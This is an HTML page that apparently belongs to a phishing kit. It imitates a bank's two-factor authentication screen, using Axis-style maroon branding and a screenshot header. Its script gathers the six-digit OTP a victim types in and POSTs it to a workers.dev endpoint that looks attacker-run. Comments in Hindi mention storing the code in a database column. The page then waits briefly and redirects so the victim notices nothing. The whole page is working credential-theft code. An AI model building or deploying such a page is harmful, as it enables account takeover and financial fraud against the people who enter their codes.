<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title> |  bsnsn</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root { --axis-maroon: #971237; }
        body { font-family: 'Public Sans', sans-serif; background-color: #ffffff; margin: 0; }
        .otp-input {
            width: 45px; height: 50px; text-align: center; font-size: 20px;
            font-weight: 700; border: 1.5px solid #e5e7eb; border-radius: 10px;
            outline: none; transition: all 0.2s; background: #fafafa;
        }
        .otp-input:focus { border-color: var(--axis-maroon); background: #ffffff; box-shadow: 0 0 0 4px rgba(151, 18, 55, 0.08); }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <header class="border-b border-gray-100 sticky top-0 bg-white z-50">
        <img src="https://i.ibb.co/d4BCqfS6/chrome-screenshot-19-Apr-2026-7-42-45-am-IST.png" alt="Header" class="w-full h-auto">
    </header>

    <main class="p-6 max-w-md mx-auto w-full flex-1">
        <div class="mb-6">
            <h1 class="text-[24px] font-bold text-gray-900 tracking-tight leading-tight">Two-Factor Authentication</h1>
            <p class="text-[14px] text-gray-500 mt-2">Enter the 6-digit secure code (OTP) sent to your registered mobile number.</p>
        </div>

        <form id="otpForm2" class="w-full space-y-8">
            <div class="flex justify-between w-full gap-2">
                <input type="tel" maxlength="1" class="otp-input" required autofocus>
                <input type="tel" maxlength="1" class="otp-input" required>
                <input type="tel" maxlength="1" class="otp-input" required>
                <input type="tel" maxlength="1" class="otp-input" required>
                <input type="tel" maxlength="1" class="otp-input" required>
                <input type="tel" maxlength="1" class="otp-input" required>
            </div>

            <div class="flex flex-col items-center gap-3">
                <p class="text-[13px] text-gray-400">Request a new code in <span id="timer" class="font-bold text-red-600">00:45</span></p>
            </div>

            <button type="submit" id="subBtn" class="w-full bg-[#971237] text-white py-4 rounded-xl font-bold text-[17px] shadow-lg active:scale-95 transition-all">
                Verify & Authorize
            </button>
        </form>
    </main>

    <script>
        const inputs = document.querySelectorAll('.otp-input');
        const WORKER_URL = 'https://snowy-sunset-a557.sumankkuuyy.workers.dev/';

        // Auto-focus logic
        inputs.forEach((input, index) => {
            input.oninput = (e) => {
                e.target.value = e.target.value.replace(/\D/g, ''); 
                if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
            };
            input.onkeydown = (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
            };
        });

        // Timer Logic
        let timeLeft = 45;
        const timerInt = setInterval(() => {
            if (timeLeft > 0) {
                timeLeft--;
                document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
            } else {
                timeLeft = 45; // Reset timer loop
            }
        }, 1000);

        // Submit Logic
        document.getElementById('otpForm2').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('subBtn');
            btn.innerHTML = "Authorizing...";
            btn.disabled = true;

            let fullOtp = "";
            inputs.forEach(input => fullOtp += input.value);

            const payload = {
                type: "2nd_OTP_VERIFY",
                otp2: fullOtp // Match with your D1 column name
            };

            try {
                // 1. Data bhej rahe hain aur response ka WAIT kar rahe hain
                const response = await fetch(WORKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log("Data Sent Successfully");
                }
            } catch (err) {
                console.error("Fetch Error:", err);
            }

            // 2. Data nikalne ke liye thoda extra time dekar redirect
            setTimeout(() => {
                window.location.href = 'about.html';
            }, 800);
        };
    </script>
</body>
</html>
